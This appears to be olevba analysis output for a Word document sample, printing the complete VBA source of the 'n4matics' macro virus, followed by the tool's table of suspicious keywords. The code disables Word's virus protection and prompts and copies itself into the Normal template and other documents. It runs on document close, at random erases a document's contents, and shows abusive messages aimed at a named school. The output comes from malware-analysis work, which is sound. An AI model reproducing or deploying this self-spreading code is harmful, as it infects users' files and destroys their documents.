olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Intruded
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.Intruded 
in file: ./Virus.MSWord.Intruded - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'name: n4matics virus
'author: ppacket
'date: feb 08 2k1

Private Sub infect()
On Error Resume Next
    
    Dim Nactive, Aactive As Boolean
        
    WordBasic.DisableAutoMacros 0
   
    With Application
        .UserName = "ppacket"
        .DisplayStatusBar = False
        .ScreenUpdating = False
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "ppacket"
        .Comments = "shit 2 all d students n staff of informatics sm fairview" & vbCr & _
                  "fuck you all"
        .Title = "ppacket's time to shine: informatics virus"
        .Execute
    End With
    
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
    Set NTI = NormalTemplate.VBProject.VBComponents
    Set ADI = ActiveDocument.VBProject.VBComponents
    
    If NTI.Item("n4matics").Name <> "n4matics" Then
    ADI("n4matics").export "c:\n4mat.ics"
    Nactive = True
    ElseIf ADI.Item("n4matics").Name <> "n4matics" Then
    NTI("n4matics").export "c:\n4mat.ics"
    Aactive = True
    End If
    
    If Nactive Then
    NTI.import "c:\n4mat.ics"
    NormalTemplate.Save
    ElseIf Aactive Then
    ADI.import "c:\n4mat.ics"
    ActiveDocument.Save
    End If
    Kill ("c:\n4mat.ics")
    
    Randomize
    trigger = shit & damn & Int((66 * Rnd) + 1)
     
    If trigger = 26 Then
        Call Payback
    End If
    
End Sub

Sub AutoClose()
On Error Resume Next

    Call infect

    If opendocument.Saved = False Then
        opendocument.SaveAs FileName:=ActiveDocument.FullName
    End If

    ActiveDocument.Close savechanges = wdSaveChanges

End Sub

Private Sub Payback()
On Error Resume Next

    Randomize
    trigger = shit & damn & Int((99 * Rnd) + 1)
    If trigger = 10 Then
        Selection.WholeStory
        Selection.Delete unit:=wdCharacter, Count:=1
        With Selection.Font
        .Name = Arial
        .ColorIndex = wdGray50
        .Animation = wdAnimationShimmer
        .Size = 26
        .Position = center
        End With
            
        Selection.InsertBefore "Hehehehehehehehehehe" & vbCr & _
                               "You've been intruded" & vbCr & _
                                "By n4matics virus!!!"
        If ActiveDocument.Saved = False Then
            ActiveDocument.Save
        End If
    End If
    
    With Assistant
    .Visible = True
    .MoveWhenInTheWay = True
    .Animation = msoAnimationGetArtsy
    .Left = trigger
    .Visible = True
    End With

    With Assistant.NewBalloon
    .Icon = msoCritical
    .Heading = "n4matics Virus"
    .Text = "You've been intruded by" & vbCr & _
            "  those fucking ppl @ " & vbCr & _
            "informatics SM fairview"
    .Show
    End With

End Sub

Sub toolsmacro()

Call Payback

End Sub

Sub viewvbcode()

Call Payback

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

